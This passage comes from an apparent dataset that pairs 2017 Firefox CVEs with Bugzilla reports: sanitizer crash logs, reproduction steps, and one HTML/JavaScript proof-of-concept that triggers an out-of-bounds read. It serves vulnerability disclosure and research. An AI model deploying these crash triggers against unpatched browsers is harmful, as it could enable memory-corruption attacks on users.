nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4075 #21 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #22 0x7f3178d7ea46 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #23 0x7f3178d7ea46 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4075 #24 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #25 0x7f3178d6a4d6 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #26 0x7f3178d6a4d6 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11064 #27 0x7f3178d7e759 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4079:9 #28 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #29 0x7f3178d7ea46 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #30 0x7f3178d7ea46 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4075 #31 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #32 0x7f3178d7ea46 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #33 0x7f3178d7ea46 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4075 #34 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #35 0x7f3178d6a4d6 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #36 0x7f3178d6a4d6 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11064 #37 0x7f3178d7e759 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4079:9 #38 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #39 0x7f3178d7ea46 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #40 0x7f3178d7ea46 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4075 #41 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #42 0x7f3178d6a4d6 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #43 0x7f3178d6a4d6 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11064 #44 0x7f3178d7340b in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:12081:3 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsIFrame.h:676:43 in GetContent Shadow bytes around the buggy address: 0x0c4a80071680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80071690: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800716a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800716b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800716c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c4a800716d0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800716e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800716f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80071700: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80071710: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80071720: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==7691==ABORTING"
      }
    ],
    "CVE-2017-5443": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1342661",
        "title": "Out of bound read in nsBinHexDecoder::DetectContentType",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Steps to reproduce: 1. Build Firefox with Address Sanitizer. I built with options and instructions mentioned in \"Manual Build\" section in https://developer.mozilla.org/en-US/docs/Mozilla/Testing/Firefox_and_Address_Sanitizer 2. Start firefox. 3. Open attached binhex.hqx. Actual results: Address Sanitizer will display this error. ==28086==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000232040 at pc 0x00000044b58e bp 0x7fff4a98c270 sp 0x7fff4a98ba20 READ of size 10 at 0x602000232040 thread T0 (Web Content) #0 0x44b58d in __interceptor_strrchr.part.28 clang/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:499 #1 0x44b58d in ?? ??:0 #2 0x7f984665893e in mozilla::net::nsBinHexDecoder::DetectContentType(nsIRequest*, nsCString const&) /firefox/netwerk/streamconv/converters/nsBinHexDecoder.cpp:486 (discriminator 2) #3 0x7f984665893e in ?? ??:0 #4 0x7f9846657dd9 in mozilla::net::nsBinHexDecoder::ProcessNextState(nsIRequest*, nsISupports*) /firefox/netwerk/streamconv/converters/nsBinHexDecoder.cpp:185 #5 0x7f9846657dd9 in ?? ??:0 #6 0x7f984665731d in mozilla::net::nsBinHexDecoder::ProcessNextChunk(nsIRequest*, nsISupports*, unsigned int) /firefox/netwerk/streamconv/converters/nsBinHexDecoder.cpp:408 #7 0x7f984665731d in ?? ??:0 #8 0x7f9846656b24 in mozilla::net::nsBinHexDecoder::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /firefox/netwerk/streamconv/converters/nsBinHexDecoder.cpp:141 ................... 0x602000232040 is located 0 bytes to the right of 16-byte region [0x602000232030,0x602000232040) allocated by thread T0 (Web Content) here: #0 0x4d2628 in __interceptor_malloc _asan_rtl_ #1 0x4d2628 in ?? ??:0 #2 0x7f9845f57709 in nsStringBuffer::Alloc(unsigned long) /firefox/xpcom/string/nsSubstring.cpp:217 #3 0x7f9845f57709 in ?? ??:0 #4 0x7f9845f55b94 in nsACString_internal::MutatePrep(unsigned int, char**, unsigned int*) /firefox/xpcom/string/nsTSubstring.cpp:158 #5 0x7f9845f55b94 in ?? ??:0 #6 0x7f9845f4ae40 in nsACString_internal::SetCapacity(unsigned int, mozilla::fallible_t const&) /firefox/xpcom/string/nsTSubstring.cpp:696 #7 0x7f9845f4ae40 in ?? ??:0 #8 0x7f9845f5eb2c in nsACString_internal::SetCapacity(unsigned int) /firefox/xpcom/string/nsTSubstring.cpp:675 #9 0x7f9845f5eb2c in ?? ??:0 #10 0x7f9845f4a741 in nsACString_internal::SetLength(unsigned int) /firefox/xpcom/string/nsTSubstring.cpp:727 #11 0x7f9845f4a741 in ?? ??:0 #12 0x7f9846657ce6 in mozilla::net::nsBinHexDecoder::ProcessNextState(nsIRequest*, nsISupports*) /firefox/netwerk/streamconv/converters/nsBinHexDecoder.cpp:170 #13 0x7f9846657ce6 in ?? ??:0 #14 0x7f984665731d in mozilla::net::nsBinHexDecoder::ProcessNextChunk(nsIRequest*, nsISupports*, unsigned int) /firefox/netwerk/streamconv/converters/nsBinHexDecoder.cpp:408 #15 0x7f984665731d in ?? ??:0 #16 0x7f9846656b24 in mozilla::net::nsBinHexDecoder::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /firefox/netwerk/streamconv/converters/nsBinHexDecoder.cpp:141 ................... Expected results: Should not read out of bound data ."
      }
    ],
    "CVE-2017-5444": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1344461",
        "title": "Heap buffer overflow in nsDirIndexParser::ParseData",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Steps to reproduce: 1. Build Firefox with Address Sanitizer. I built with options and instructions mentioned in \"Manual Build\" section in https://developer.mozilla.org/en-US/docs/Mozilla/Testing/Firefox_and_Address_Sanitizer 2. Download and host httpindex.php file on a web server. Web server should support PHP. 3. Start firefox. 4. Visit httpindex.php. Actual results: Firefox tab crashed. Address Sanitizer Output --------------------------- ==4312==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6030002b7ac0 at pc 0x7fea5b5e3fc5 bp 0x7fff6d37d1b0 sp 0x7fff6d37d1a8 READ of size 1 at 0x6030002b7ac0 thread T0 (Web Content) #0 0x7fea5b5e3fc4 in nsDirIndexParser::ParseData(nsIDirIndex*, char*) firefox/netwerk/streamconv/converters/nsDirIndexParser.cpp:233 (discriminator 1) #1 0x7fea5b5e3fc4 in ?? ??:0 #2 0x7fea5b5e27bf in nsDirIndexParser::ProcessData(nsIRequest*, nsISupports*) firefox/netwerk/streamconv/converters/nsDirIndexParser.cpp:407 (discriminator 1) #3 0x7fea5b5e27bf in ?? ??:0 #4 0x7fea5b5e41a3 in nsDirIndexParser::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) firefox/netwerk/streamconv/converters/nsDirIndexParser.cpp:350 #5 0x7fea5b5e41a3 in ?? ??:0 #6 0x7fea5b783b9b in mozilla::net::HttpChannelChild::DoOnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) firefox/netwerk/protocol/http/HttpChannelChild.cpp:799 (discriminator 2) #7 0x7fea5b783b9b in ?? ??:0 ............................... 0x6030002b7ac0 is located 0 bytes to the right of 32-byte region [0x6030002b7aa0,0x6030002b7ac0) allocated by thread T0 (Web Content) here: #0 0x4d2628 in __interceptor_malloc _asan_rtl_ #1 0x4d2628 in ?? ??:0 #2 0x7fea5aedd939 in nsStringBuffer::Alloc(unsigned long) firefox/xpcom/string/nsSubstring.cpp:217 #3 0x7fea5aedd939 in ?? ??:0 #4 0x7fea5aedbdc4 in nsACString_internal::MutatePrep(unsigned int, char**, unsigned int*) firefox/xpcom/string/nsTSubstring.cpp:172 #5 0x7fea5aedbdc4 in ?? ??:0 #6 0x7fea5aed1170 in nsACString_internal::SetCapacity(unsigned int, mozilla::fallible_t const&) firefox/xpcom/string/nsTSubstring.cpp:710 #7 0x7fea5aed1170 in ?? ??:0 #8 0x7fea5aed1501 in nsACString_internal::SetLength(unsigned int, mozilla::fallible_t const&) firefox/xpcom/string/nsTSubstring.cpp:748 #9 0x7fea5aed1501 in ?? ??:0 #10 0x7fea5b5e40eb in nsDirIndexParser::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) firefox/netwerk/streamconv/converters/nsDirIndexParser.cpp:336 #11 0x7fea5b5e40eb in ?? ??:0 #12 0x7fea5b783b9b in mozilla::net::HttpChannelChild::DoOnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) firefox/netwerk/protocol/http/HttpChannelChild.cpp:799 (discriminator 2) #13 0x7fea5b783b9b in ?? ??:0 ............................... Expected results: Firefox tab should not crash due to a Heap buffer overflow."
      }
    ],
    "CVE-2017-5446": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1343505",
        "title": "Firefox crashed when encounter immature HTTP/2 server send DATA frame padding length large than payload length",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Steps to reproduce: We had a test tool that focus on HTTP/2 client/browser testing. You could reference https://github.com/summerwind/h2spec/pull/74#issuecomment-283273210 Long story short, when the server send a DATA frame defined padding length=6, but only had 5 bytes in payload(including padding length byte). Firefox would crash. Steps to reproduce: 1. mkdir src 2. export GOPATH=path to the folder created at step.1 3. mkdir -p src/github.com/summerwind 4. cd src/github.com/summerwind 5. git clone https://github.com/chhsiao90/h2spec.git 6. git checkout h2specd 7. go run cmd/h2spec/h2specd.go -t -p 8080 -c server.crt -k server.key -v 8. open firefox to http://localhost:8080 9. find the third link under 6.1. DATA marked with desc: Sends a DATA frame with invalid pad length Actual results: Firefox crashed Expected results: Marked the http2 connection as connection error, send GOAWAY frame and close the connection"
      }
    ],
    "CVE-2017-5447": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1343552",
        "title": "ASAN: out-of-bounds read in gfxTextRun (after \"ASSERTION: Invalid offset\" and \"ASSERTION: Substring out of range\")",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Steps to reproduce: There is an out-of-bounds read vulnerability in Firefox. The vulnerability was confirmed on the nightly ASan build. Please note: This bug is subject to a 90 day disclosure deadline. If 90 days elapse without a broadly available patch, then the bug report will automatically become visible to the public. With any fix, please give credit for identifying the vulnerability to Ivan Fratric of Google Project Zero. PoC: ================================================================= <style> .class1 { float: left; white-space: pre-line; } .class2 { border-bottom-style: solid; font-face: Arial; font-size: 7ex; } </style> <script> function go() { menuitem.appendChild(document.body.firstChild); canvas.toBlob(callback); } function callback() { var s = menu.style; s.setProperty(\"flex-direction\", \"row-reverse\"); option.scrollBy(); document.implementation.createHTMLDocument(\"foo\").adoptNode(progress); s.setProperty(\"flex-direction\", \"column\"); canvas.toBlob(callback); } </script> aaaaaaaaaaaaaaaaaa </head> <body onload=go()> <del class=\"class1\"> <span class=\"class2\"> <menu id=\"menu\"> <menuitem> </menu> <menuitem id=\"menuitem\"> <progress id=\"progress\"> </del> <ol dir=\"rtl\">l+0</ol> <canvas id=\"canvas\"> <option id=\"option\"> ================================================================= ASan log: ================================================================= ==104545==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000721ecc at pc 0x7fcef25af0e8 bp 0x7ffc23afd1b0 sp 0x7ffc23afd1a8 READ of size 4 at 0x611000721ecc thread T0 #0 0x7fcef25af0e7 in IsSimpleGlyph /home/worker/workspace/build/src/gfx/thebes/gfxFont.h:785:46 #1 0x7fcef25af0e7 in GetAdvanceForGlyph /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.h:638 #2 0x7fcef25af0e7 in GetAdvanceForGlyphs /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:334 #3 0x7fcef25af0e7 in gfxTextRun::GetAdvanceWidth(gfxTextRun::Range, gfxTextRun::PropertyProvider*, gfxFont::Spacing*) const /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:1074 #4 0x7fcef704ac7c in nsTextFrame::TrimTrailingWhiteSpace(mozilla::gfx::DrawTarget*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:9654:15 #5 0x7fcef6d2a2ef in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2584:44 #6 0x7fcef6d2a1c7 in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2531:11 #7 0x7fcef6d2a1c7 in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2531:11 #8 0x7fcef6d2b293 in nsLineLayout::TrimTrailingWhiteSpace() /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2654:3 #9 0x7fcef6dcc03b in nsBlockFrame::PlaceLine(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFloatManager::SavedState*, mozilla::LogicalRect&, int&, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4479:3 #10 0x7fcef6dcabe3 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4082:12 #11 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9 #12 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5 #13 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370 #14 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3 #15 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, nsReflowStatus&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3 #16 0x7fcef6dd9001 in nsBlockFrame::ReflowFloat(mozilla::BlockReflowInput&, mozilla::LogicalRect const&, nsIFrame*, mozilla::LogicalMargin&, mozilla::LogicalMargin&, bool, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:6272:5 #17 0x7fcef6d4d19f in mozilla::BlockReflowInput::FlowAndPlaceFloat(nsIFrame*) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:910:5 #18 0x7fcef6d4b143 in mozilla::BlockReflowInput::AddFloat(nsLineLayout*, nsIFrame*, int) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:627:14 #19 0x7fcef6d21369 in AddFloat /home/worker/workspace/build/src/layout/generic/nsLineLayout.h:190:12 #20 0x7fcef6d21369 in nsLineLayout::ReflowFrame(nsIFrame*, nsReflowStatus&, mozilla::ReflowOutput*, bool&) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:979 #21 0x7fcef6dcb7bb in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4153:3 #22 0x7fcef6dca446 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3954:5 #23 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9 #24 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5 #25 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370 #26 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3 #27 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, nsReflowStatus&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3 #28 0x7fcef6dbc4da in nsBlockFrame::ReflowBlockFrame(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3462:7 #29 0x7fcef6dafafa in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2831:5 #30 0x7fcef6dafafa in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370 #31 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3 #32 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3 #33 0x7fcef6e09555 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:711:5 #34 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3 #35 0x7fcef6eb0394 in nsHTMLScrollFrame::ReflowScrolledFrame(mozilla::ScrollReflowInput*, bool, bool, mozilla::ReflowOutput*, bool) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:552:3 #36 0x7fcef6eb1840 in nsHTMLScrollFrame::ReflowContents(mozilla::ScrollReflowInput*, mozilla::ReflowOutput const&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:664:3 #37 0x7fcef6eb5073 in nsHTMLScrollFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:1039:3 #38 0x7fcef6e1b964 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, int, int, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1072:3 #39 0x7fcef6d8b760 in mozilla::ViewportFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:326:7 #40 0x7fcef6b89187 in mozilla::PresShell::DoReflow(nsIFrame*, bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9202:3 #41 0x7fcef6b9cde4 in mozilla::PresShell::ProcessReflowCommands(bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9375:24 #42 0x7fcef6b9bcf6 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4174:11 #43 0x7fcef2c4646e in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:598:5 #44 0x7fcef2c4646e in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7961 #45 0x7fcef2a1f2b4 in GetPrimaryFrame /home/worker/workspace/build/src/dom/base/Element.cpp:2164:5 #46 0x7fcef2a1f2b4 in mozilla::dom::Element::GetScrollFrame(nsIFrame**, bool) /home/worker/workspace/build/src/dom/base/Element.cpp:637 #47 0x7fcef2a20871 in mozilla::dom::Element::ScrollBy(mozilla::dom::ScrollToOptions const&) /home/worker/workspace/build/src/dom/base/Element.cpp:794:28 #48 0x7fcef4112002 in mozilla::dom::ElementBinding::scrollBy(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:2492:7 #49 0x7fcef45cdd27 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #50 0x7fcefa0cc04f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #51 0x7fcefa0cc04f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #52 0x7fcefa0b2970 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #53 0x7fcefa0b2970 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2955 #54 0x7fcefa097c9b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #55 0x7fcefa0cc366 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #56 0x7fcefa0cca42 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #57 0x7fcefaa9cd1c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2878:12 #58 0x7fcef4242c05 in mozilla::dom::BlobCallback::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Blob*, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLCanvasElementBinding.cpp:81:8 #59 0x7fcef475613f in Call /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/HTMLCanvasElementBinding.h:180:12 #60 0x7fcef475613f in mozilla::dom::CanvasRenderingContextHelper::ToBlob(JSContext*, nsIGlobalObject*, mozilla::dom::BlobCallback&, nsAString_internal const&, JS::Handle<JS::Value>, mozilla::ErrorResult&)::EncodeCallback::ReceiveBlob(already_AddRefed<mozilla::dom::Blob>) 